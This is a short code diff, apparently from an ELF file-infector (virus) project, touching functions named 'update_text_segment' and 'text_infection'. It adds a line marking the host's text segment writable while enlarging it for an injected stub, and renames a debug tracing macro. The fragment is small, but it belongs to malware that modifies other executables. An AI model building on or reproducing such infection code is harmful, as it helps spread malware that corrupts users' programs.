@@ -23,6 +23,8 @@ __attribute__((always_inline)) static inline bool is_text_segment(const Elf64_Ph
 
 __attribute__((always_inline)) static inline void update_text_segment(Elf64_Phdr *segment)
 {
+	segment->p_flags |= PF_W;
+
 	segment->p_filesz += STUB_SIZE;
 	segment->p_memsz += STUB_SIZE;
 }
@@ -35,8 +37,8 @@ void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_con
 {
 //	decrypt_left(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
 
-#if DEBUG
-	MID_TRACER("text_infection:\t\t");
+#if LOGGER
+	MID_LOGGER("text_infection:\t\t");
 #endif
 
 	if (context == FAILURE)
